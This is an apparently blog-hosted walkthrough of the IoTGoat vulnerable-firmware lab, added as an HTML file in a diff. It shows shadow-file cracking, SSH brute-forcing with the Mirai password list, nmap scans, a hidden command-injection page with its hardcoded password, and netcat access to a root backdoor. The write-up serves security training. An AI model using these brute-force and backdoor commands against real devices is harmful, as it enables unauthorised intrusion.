@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Mr.Be1ieVe&#39;s Treasure">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg">
+    <meta property="twitter:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg" />
+    
+
+    
+    <meta name="title" content="IoTGoat" />
+    <meta property="og:title" content="IoTGoat" />
+    <meta property="twitter:title" content="IoTGoat" />
+    
+
+    
+    <meta name="description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。">
+    <meta property="og:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    <meta property="twitter:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Mr.Be1ieVe">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>IoTGoat | Mr.Be1ieVe的博客 | Mr.Be1ieVe&#39;s Blog</title>
+
+    <link rel="canonical" href="/post/iotgoat/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Mr.Be1ieVe&#39;s Treasure</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95">个人原则宪法</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E5%AE%9E%E8%B7%B5">安全建设实践</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E4%B8%8E%E5%88%86%E6%9E%90">底层原理思考与分析</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg-universe.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>IoTGoat</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                    Mr.Be1ieVe&#39;s Treasure
+                             
+                            on 
+                            Tuesday, November 3, 2020
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h2 id="no-1-weak-guessable-or-hardcoded-passwords">No 1: Weak, Guessable, or Hardcoded Passwords:</h2>
+<pre tabindex="0"><code>$ find . -name cgi-bin
+./www/cgi-bin
+</code></pre><p>查找，<a href="https://github.com/craigz28/firmwalker">firmwalker</a></p>
+<blockquote>
+<p>It will search through the extracted or mounted firmware file system for things of interest such as:</p>
+<ul>
+<li>etc/shadow and etc/passwd</li>
+<li>list out the etc/ssl directory</li>
+<li>search for SSL related files such as .pem, .crt, etc.</li>
+<li>search for configuration files</li>
+<li>look for script files</li>
+<li>search for other .bin files</li>
+<li>look for keywords such as admin, password, remote, etc.</li>
+<li>search for common web servers used on IoT devices</li>
+<li>search for common binaries such as ssh, tftp, dropbear, etc.</li>
+<li>search for URLs, email addresses and IP addresses</li>
+<li>Experimental support for making calls to the Shodan API using the Shodan CLI</li>
+</ul>
+</blockquote>
+<pre tabindex="0"><code>$ ./firmwalker.sh ../firmware/_IoTGoat-x86.img.extracted/squashfs-root/ ./IoTGoat.txt
+</code></pre><blockquote>
+<p><strong>/etc/shadow</strong>
+保存了加密的真实密码</p>
+<pre tabindex="0"><code>root:$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1:
+|                |
+1                2
+</code></pre><ol>
+<li>
+<p><strong>Username</strong> : It is your login name.</p>
+</li>
+<li>
+<p><strong>Password</strong>: It is your encrypted password. The password should be minimum 8-12 characters long including special characters, digits, lower case alphabetic and more. Usually password format is set to</p>
+<p><code>$id$salt$hashed</code>, The<code>$id</code>is the algorithm used On GNU/Linux as follows:</p>
+<ol>
+<li><code>$1$</code> is MD5</li>
+<li><code>$2a$</code> is Blowfish</li>
+<li><code>$2y$</code>is Blowfish</li>
+<li><code>$5$</code> is SHA-256</li>
+<li><code>$6$</code>is SHA-512</li>
+</ol>
+<p><a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/">more</a></p>
+</li>
+</ol>
+</blockquote>
+<p>爆破密码</p>
+<pre tabindex="0"><code>$ john --show ./etc/shadow
+0 password hashes cracked, 2 left
+</code></pre><p>hashcat也可以解密md5等，很强大但是我不大会用。。</p>
+<p>medusa</p>
+<blockquote>
+<p>Hydra, Medusa, or Ncrack都可以用来爆破</p>
+</blockquote>
+<p>加上使用<a href="https://github.com/danielmiessler/SecLists">SecList</a></p>
+<blockquote>
+<p>SecLists is the security tester&rsquo;s companion. It&rsquo;s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.</p>
+</blockquote>
+<p>使用命令<code>awk '{print $2}' SecLists/Passwords/Malware/mirai-botnet.txt &gt; SecLists/Passwords/Malware/mirai-botnet_passwords.txt</code>来把密码部分导出到一个文件里</p>
+<p>然后</p>
+<pre tabindex="0"><code>$ medusa -u iotgoatuser -P ./SecLists/Passwords/Malware/mirai-botnet_passwords.txt -h 192.168.56.101 -M ssh
+</code></pre><p>即可爆破到ssh的密码<code>7ujMko0vizxv </code></p>
+<h2 id="no-2-insecure-network-services">No 2: Insecure Network Services:</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kali@kali:~/Desktop/IoTGoat$ nmap -p20-6000 192.168.56.101
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2020-11-09 02:45 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 192.168.56.101 <span style="color:#ff79c6">(</span>192.168.56.101<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.0026s latency<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#bd93f9">5973</span> filtered ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>25/tcp   open  smtp
+</span></span><span style="display:flex;"><span>53/tcp   open  domain                
+</span></span><span style="display:flex;"><span>80/tcp   open  http                                       110/tcp  open  pop3
+</span></span><span style="display:flex;"><span>443/tcp  open  https                                       5000/tcp open  upnp                                       5515/tcp open  unknown
+</span></span></code></pre></div><pre tabindex="0"><code>ali@kali:~/Desktop/IoTGoat$ sudo nmap -sU -p20-6000 192.168.56.101 &gt; ScanUdpResult.txt                         kali@kali:~/Desktop/IoTGoat$ cat ScanUdpResult.txt 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 03:20 EST                                                 Nmap scan report for 192.168.56.101 (192.168.56.101)       Host is up (0.00058s latency).                             Not shown: 5980 open|filtered ports                      PORT   STATE SERVICE                                       53/udp open  domain                                       Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds  
+</code></pre><p>但是我的upnp好像不起作用，只能贴wp了</p>
+<blockquote>
+<pre tabindex="0"><code>nmap -p5000 -sV 172.16.100.213
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 23:10 EDT
+Nmap scan report for IoTGoat (172.16.100.213)
+Host is up (0.00045s latency).
+
+PORT     STATE SERVICE VERSION
+5000/tcp open  upnp    MiniUPnP 2.1 (UPnP 1.1)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V=7.80%I=7%D=5/4%Time=5EB0D91A%P=x86_64-pc-linux-gnu%r(Gen
+SF:ericLines,124,&#34;\x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/h
+SF:tml\r\nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\x20Ope
+SF:nWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n&lt;HTML&gt;&lt;HEA
+SF:D&gt;&lt;TITLE&gt;501\x20Not\x20Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not\x20Imple
+SF:mented&lt;/H1&gt;The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20t
+SF:his\x20server\.&lt;/BODY&gt;&lt;/HTML&gt;\r\n&#34;)%r(GetRequest,117,&#34;HTTP/1\.0\x20404\
+SF:x20Not\x20Found\r\nContent-Type:\x20text/html\r\nConnection:\x20close\r
+SF:\nContent-Length:\x20134\r\nServer:\x20OpenWRT/18\.06\.2\x20UPnP/1\.1\x
+SF:20MiniUPnPd/2\.1\r\n
+[SNIP]
+&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not\x20Implemented&lt;
+SF:/H1&gt;The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20this\x20
+SF:server\.&lt;/BODY&gt;&lt;/HTML&gt;\r\n&#34;);
+MAC Address: 00:0C:29:00:AC:E7
+</code></pre><p>Analyze the service detection response details and note information such as the service version (<code>MiniUPnP 2.1</code>), server version (<code>OpenWrt 18.06.2</code>), as well as the error code details. Proceed with interrogating each listening services with aggressive scripts that aid in vulnerability identification based on service versioning. Try searching for appropriate <code>nmap scripts</code> in Kali Linux under <code>/usr/share/nmap/scripts</code> directory. A <code>upnp</code> example using <code>broadcast-upnp-info</code> script is shown below.</p>
+<pre tabindex="0"><code>nmap -sV --script=broadcast-upnp-info 172.16.100.213
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 23:39 EDT
+Pre-scan script results:
+| broadcast-upnp-info: 
+|   239.255.255.250
+|       Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
+|       Location: http://192.168.50.143:5000/rootDesc.xml
+|         Webserver: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
+|         Name: OpenWRT router
+|         Manufacturer: OpenWRT
+|         Model Descr: OpenWRT router
+|         Model Name: OpenWRT router
+|         Model Version: 1
+|         Name: WANDevice
+|         Manufacturer: MiniUPnP
+|         Model Descr: WAN Device
+|         Model Name: WAN Device
+|         Model Version: 20190130
+|         Name: WANConnectionDevice
+|         Manufacturer: MiniUPnP
+|         Model Descr: MiniUPnP daemon
+|         Model Name: MiniUPnPd
+|_        Model Version: 20190130
+[SNIP]
+Nmap scan report for IoTGoat (192.168.50.143)
+Host is up (0.00045s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      Dropbear sshd (protocol 2.0)
+53/tcp   open  domain   dnsmasq 2.73
+80/tcp   open  http     LuCI Lua http config
+443/tcp  open  ssl/http LuCI Lua http config
+5000/tcp open  upnp     MiniUPnP 2.1 (UPnP 1.1)
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.0 404 Not Found
+|     Content-Type: text/html
+|     Connection: close
+|     Content-Length: 134
+|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
+|     Ext:
+|     &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not Found&lt;/H1&gt;The requested URL was not found on this server.&lt;/BODY&gt;&lt;/HTML&gt;
+|   GenericLines: 
+|     501 Not Implemented
+|     Content-Type: text/html
+|     Connection: close
+|     Content-Length: 149
+|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
+|     Ext:
+|     &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;501 Not Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not Implemented&lt;/H1&gt;The HTTP Method is not implemented by this server.&lt;/BODY&gt;&lt;/HTML&gt;
+|   HTTPOptions: 
+[SNIP] 
+</code></pre></blockquote>
+<h2 id="no-3-insecure-ecosystem-interfaces">No 3: Insecure Ecosystem Interfaces:</h2>
+<h3 id="隐藏的web-shell">隐藏的web shell</h3>
+<p>在web服务器config文件<code>./etc/config/uhttpd</code>可以看到<code>lua_prefix</code></p>
+<pre tabindex="0"><code>kali@kali:~/Desktop/IoTGoat/_IoTGoat-x86.img.extracted/squashfs-root$ cat ./etc/config/uhttpd | grep &#34;/&#34;
+        option home             /www
+        option cert             /etc/uhttpd.crt
+        option key              /etc/uhttpd.key
+        # Default is /cgi-bin
+        option cgi_prefix       /cgi-bin
+        list lua_prefix         &#34;/cgi-bin/luci=/usr/lib/lua/luci/sgi/uhttpd.lua&#34;
+</code></pre><p>这个lua_prefix是用来跳转到对应文件的，可参考<a href="https://blog.csdn.net/qq_26202991/article/details/102621184">这里</a></p>
+<p>然后在<code>./usr/lib/lua/luci/</code>可以看见</p>
+<pre tabindex="0"><code>├───cbi
+├───controller
+│   ├───admin
+│   └───iotgoat
+│   ├───cbi
+│   │   ├───admin_network
+│   │   ├───admin_status
+│   │   ├───admin_system
+│   │   │   └───fstab
+│   │   ├───firewall
+│   │   └───upnp
+│   └───network
+├───sgi
+├───sys
+│   └───zoneinfo
+├───template
+├───tools
+    ├───admin_network
+    │   └───index
+    ├───admin_system
+    ├───admin_uci
+    ├───cbi
+    ├───firewall
+    ├───iotgoat
+        └───bootstrap
+</code></pre><p>在<code>controller/iotgoat/iotgoat.lua</code>中可以看到index函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#ff79c6">function</span> <span style="color:#50fa7b">index</span>()
+</span></span><span style="display:flex;"><span>    entry({<span style="color:#f1fa8c">&#34;admin&#34;</span>, <span style="color:#f1fa8c">&#34;iotgoat&#34;</span>}, firstchild(), <span style="color:#f1fa8c">&#34;IoTGoat&#34;</span>, <span style="color:#bd93f9">60</span>).dependent<span style="color:#ff79c6">=</span><span style="color:#ff79c6">false</span>
+</span></span><span style="display:flex;"><span>    entry({<span style="color:#f1fa8c">&#34;admin&#34;</span>, <span style="color:#f1fa8c">&#34;iotgoat&#34;</span>, <span style="color:#f1fa8c">&#34;cmdinject&#34;</span>}, template(<span style="color:#f1fa8c">&#34;iotgoat/cmd&#34;</span>), <span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>    entry({<span style="color:#f1fa8c">&#34;admin&#34;</span>, <span style="color:#f1fa8c">&#34;iotgoat&#34;</span>, <span style="color:#f1fa8c">&#34;cam&#34;</span>}, template(<span style="color:#f1fa8c">&#34;iotgoat/camera&#34;</span>), <span style="color:#f1fa8c">&#34;Camera&#34;</span>, <span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>    entry({<span style="color:#f1fa8c">&#34;admin&#34;</span>, <span style="color:#f1fa8c">&#34;iotgoat&#34;</span>, <span style="color:#f1fa8c">&#34;door&#34;</span>}, template(<span style="color:#f1fa8c">&#34;iotgoat/door&#34;</span>), <span style="color:#f1fa8c">&#34;Doorlock&#34;</span>, <span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>    entry({<span style="color:#f1fa8c">&#34;admin&#34;</span>, <span style="color:#f1fa8c">&#34;iotgoat&#34;</span>, <span style="color:#f1fa8c">&#34;webcmd&#34;</span>}, call(<span style="color:#f1fa8c">&#34;webcmd&#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">end</span>
+</span></span></code></pre></div><p>在<code>view/iotgoat/</code>里有<code>cmd.html</code></p>
+<p>所以访问<code>https://&lt;IoTGoat_IP&gt;/cgi-bin/luci/admin/iotgoat/cmdinject</code>即可</p>
+<p>需要登陆密码，<code>iotgoathardcodedpassword</code></p>
+<p>在cmd中输入<code>telnet -p 9999</code>，linux nc即可连入</p>
+<blockquote>
+<p>更多有关luci可以参考</p>
+<p><a href="https://www.cnblogs.com/x_wukong/p/4505240.html">luci框架-LUA的一个web框架使用</a></p>
+<p><a href="https://github.com/openwrt/luci/wiki">openwrt luci的wiki</a></p>
+</blockquote>
+<h3 id="后门">后门</h3>
+<p>前面有个5515端口是未知的，nc连一下居然是后门。。</p>
+<pre tabindex="0"><code>nc 192.168.56.102 5515
+[***]Successfully Connected to IoTGoat&#39;s Backdoor[***]
+
+ls
+bin
+boot
+dev
+dnsmasq_setup.sh
+etc
+lib
+mnt
+overlay
+proc
+rom
+root
+sbin
+sys
+tmp
+usr
+var
+www
+
+id
+uid=0(root) gid=0(root)
+</code></pre><h3 id="xss">XSS</h3>
+<p>Network/Firewall/Traffic Rules里</p>
+<p>New forward rule 、 New source NAT 的Name 有XSS</p>
+<blockquote>
+<p>快速了解：<a href="https://zhuanlan.zhihu.com/p/26177815">浅谈XSS攻击的那些事（附常用绕过姿势）</a></p>
+</blockquote>
+<h2 id="no-4-lack-of-secure-update-mechanism">No 4: Lack of Secure Update Mechanism:</h2>
+<h3 id="insecure-package-update-configuration-defaults-including-cve-2020-7982">Insecure package update configuration defaults including CVE-2020-7982.</h3>
+<p><a href="https://www.anquanke.com/post/id/202039">OPENWRT中的远程命令执行漏洞（CVE-2020-7982）[CN]</a></p>
+<h2 id="no-5-use-of-insecure-or-outdated-components">No 5: Use of Insecure or Outdated Components:</h2>
+<h3 id="several-insecure-and-outdated-software-components-with-cves-such-as-dnsmasq-pppd-linux-kernel-busybox-wpa_supplicant-and-more">Several insecure and outdated software components with CVEs such as Dnsmasq, pppd, Linux Kernel, BusyBox, wpa_supplicant, and more.</h3>
+<p>Todo: auto scan</p>
+<p>TLS 1.2</p>
+<p>ssh 2.0</p>
+<p>pppd 2.4.7</p>
+<p>Dnsmasq 2.73</p>
+<p>wpa_supplicant v2.7-devel</p>
+<p>BusyBox v1.28.4</p>
+<h2 id="no-6-insufficient-privacy-protection">No 6: Insufficient Privacy Protection:</h2>
+<h3 id="pii-data-captured-and-stored-insecurely">PII data captured and stored insecurely.</h3>
+<p>Personally identifiable information (PII)</p>
+<p>firmwalker搜索的db文件</p>
+<pre tabindex="0"><code>##################################### *.db
+/usr/lib/lua/luci/controller/iotgoat/sensordata.db
+</code></pre><p>然后使用sqlite3</p>
+<pre tabindex="0"><code>kali@kali:~/Desktop/IoTGoat/_IoTGoat-x86.img.extracted/squashfs-root/usr/lib/lua/luci/controller/iotgoat$ sqlite3 sensordata.db 
+SQLite version 3.32.3 2020-06-18 14:00:33
+Enter &#34;.help&#34; for usage hints.
+sqlite&gt; .dump
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE sensors(id INTEGER PRIMARY KEY AUTOINCREMENT, temperature NUMERIC, humidity NUMERIC, currentdate DATE, currentime TIME, name TEXT, email TEXT, birthdate NUMERIC);
+INSERT INTO sensors VALUES(1,22.399999999999998579,68,&#39;2020-03-24&#39;,&#39;18:56:33&#39;,&#39;johnsmith&#39;,&#39;johnsmith@gmail.com&#39;,1311977);
+INSERT INTO sensors VALUES(2,29.699999999999999289,98,&#39;2020-03-24&#39;,&#39;18:56:43&#39;,&#39;jillsmith&#39;,&#39;jillsmith@gmail.com&#39;,4141979);
+INSERT INTO sensors VALUES(3,31.199999999999999289,28,&#39;2020-03-24&#39;,&#39;18:57:05&#39;,&#39;walter&#39;,&#39;waltergary@yopmail.com&#39;,32821969);
+INSERT INTO sensors VALUES(4,16.899999999999998578,38,&#39;2020-03-24&#39;,&#39;18:57:20&#39;,&#39;WilliamRonald&#39;,&#39;billronald@yopmail.com&#39;,11141989);
+INSERT INTO sensors VALUES(5,35,78,&#39;2020-03-24&#39;,&#39;18:58:04&#39;,&#39;Test&#39;,&#39;TstUser@aol.com&#39;,12121990);
+INSERT INTO sensors VALUES(6,35,88,&#39;2020-03-24&#39;,&#39;18:58:18&#39;,&#39;Sgt&#39;,&#39;sgtmajor@us.gov&#39;,10171956);
+DELETE FROM sqlite_sequence;
+INSERT INTO sqlite_sequence VALUES(&#39;sensors&#39;,6);
+COMMIT;
+sqlite&gt; 
+</code></pre><h2 id="no-7-insecure-data-transfer-and-storage">No 7: Insecure Data Transfer and Storage:</h2>
+<p><code>&lt;IP&gt;/cgi-bin/luci/admin/network/wireless/wl0.network1</code></p>
+<p>wifi没有密码</p>
+<h2 id="no-8-lack-of-device-management">No 8: Lack of Device Management:</h2>
+<p><code>&lt;IP&gt;/cgi-bin/luci/admin/status/syslog</code>没有开启</p>
+<h2 id="no-9-insecure-default-settings">No 9: Insecure Default Settings:</h2>
+<h3 id="many-included-in-iotgoat-such-as-missing-secure-headers-to-prevent-framing-as-well-as-csrf-protections-on-sensitive-requests">Many included in IoTGoat such as missing secure headers to prevent framing as well as CSRF protections on sensitive requests.</h3>
+<blockquote>
+<p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
+<p>​    目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p>
+<p><a href="https://blog.csdn.net/xiaoxinshuaiga/article/details/80766369">link</a></p>
+</blockquote>
+<h2 id="no-10-lack-of-physical-hardening">No 10: Lack of Physical Hardening:</h2>
+<p>物理强化，应该是指对固件的保护</p>
+
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://mrbelieve.tech"><img src="/img/favicon.png" />Mr.Be1ieVe&#39;s Treasure</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/netgear-nighthawk-r8300-upnpd-preauth-rce-%E5%A4%8D%E7%8E%B0%E8%BE%85%E5%8A%A9/" data-toggle="tooltip" data-placement="top" title="Netgear Nighthawk R8300 upnpd PreAuth RCE 复现辅助">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/hackthebox-starting-point-oopsie-.28/" data-toggle="tooltip" data-placement="top" title="HackTheBox Starting Point Oopsie .28">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/awd" title="awd">
+                            awd
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/buu" title="buu">
+                            buu
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/hackthebox" title="hackthebox">
+                            hackthebox
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/linux%E4%BD%BF%E7%94%A8" title="linux使用">
+                            linux使用
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/xray" title="xray">
+                            xray
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0" title="专业学习">
+                            专业学习
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="基础知识">
+                            基础知识
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="学习笔记">
+                            学习笔记
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:mr_believe@outlook.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/MrBe1ieVe">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="Mr.Be1ieVe&#39;s Treasure" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
